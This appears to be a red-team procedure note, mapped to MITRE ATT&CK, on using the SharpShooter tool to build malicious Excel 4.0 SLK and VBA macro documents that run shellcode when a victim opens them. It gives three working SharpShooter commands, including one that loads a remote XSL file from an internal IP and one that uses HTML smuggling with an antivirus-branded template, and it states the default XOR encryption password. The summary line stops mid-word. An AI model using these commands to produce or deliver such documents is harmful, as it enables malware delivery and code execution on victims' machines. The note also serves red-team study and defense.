---
id: b727aa76-0d85-4dbc-ab4e-be6b81ab8f17
name: XLM Excel 4.0 - SharpShooter Payload Creation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.276981+00:00'
updated_at: '2023-04-10T20:36:58.337114+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Office Application Startup|T1137 - Office Application Startup]]'
sub_techniques:
- '[[PowerShell|T1059.001 - PowerShell]]'
tags:
- '[[Office - Attacks]]'
- '[[XLM Excel 4.0 - SharpShooter]]'
commands:
- '[[Create an Excel 4.0 SLK Macro Enabled Document using custom shellcode]]'
- '[[Create a stageless payload using raw shellcode file]]'
- '[[Create a VBA Macro using XMLDOM COM interface]]'
---

# XLM Excel 4.0 - SharpShooter Payload Creation

## Summary

The XLM Excel 4.0 - SharpShooter Payload Creation procedure involves the creation of a malicious Excel document that uses the XLM macro language and the SharpShooter tool to deliver a payload. This technique is commonly used to bypass security controls that are designed to detect and block traditio

## Description

# Description

The XLM Excel 4.0 - SharpShooter Payload Creation procedure involves the creation of a malicious Excel document that uses the XLM macro language and the SharpShooter tool to deliver a payload. This technique is commonly used to bypass security controls that are designed to detect and block traditional macros. The attacker can use this procedure to gain initial access to a target system and execute code on the victim's machine. To create the malicious document, the attacker can use the provided SharpShooter Payload Creation Commands to generate a payload and embed it into an Excel spreadsheet. When the victim opens the document, the payload is executed, providing the attacker with a foothold on the target system.

## Requirements

1. Access to an Excel spreadsheet

1. SharpShooter tool

## Defense

1. Use security software that can detect and block malicious macros

1. Disable the execution of macros in Microsoft Office by default

1. Educate users on the risks of opening unsolicited attachments

## Objectives

1. Gain initial access to a target system

1. Execute code on the victim's machine

# Instructions

1. Use the above commands to create different payloads using SharpShooter tool.

**Code**: [[# Options
-rawscfile <path>  Path to raw shellcode]]

> The commands use different flags and options to create payloads with different properties. The first command creates a stageless payload, the second creates a VBA Macro using XMLDOM COM interface, the third creates an Excel 4.0 SLK Macro Enabled Document, and the fourth creates an Excel 4.0 SLK Macro Enabled Document with custom shellcode. The --password flag can be used to encrypt the generated document using XOR Obfuscation in Macrome build mode. The default password is **VelvetSweatshop** and can only be set in Excel 2003.

**Command** ([[Create a stageless payload using raw shellcode file]]):

```bash
python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test
```

**Command** ([[Create a VBA Macro using XMLDOM COM interface]]):

```bash
SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```

**Command** ([[Create an Excel 4.0 SLK Macro Enabled Document using custom shellcode]]):

```bash
SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Office Application Startup|T1137 - Office Application Startup]]

### Sub-Techniques

- [[PowerShell|T1059.001 - PowerShell]]

## Commands Used

- [[Create an Excel 4.0 SLK Macro Enabled Document using custom shellcode]]
- [[Create a stageless payload using raw shellcode file]]
- [[Create a VBA Macro using XMLDOM COM interface]]

## Tags

- [[Office - Attacks]]
- [[XLM Excel 4.0 - SharpShooter]]
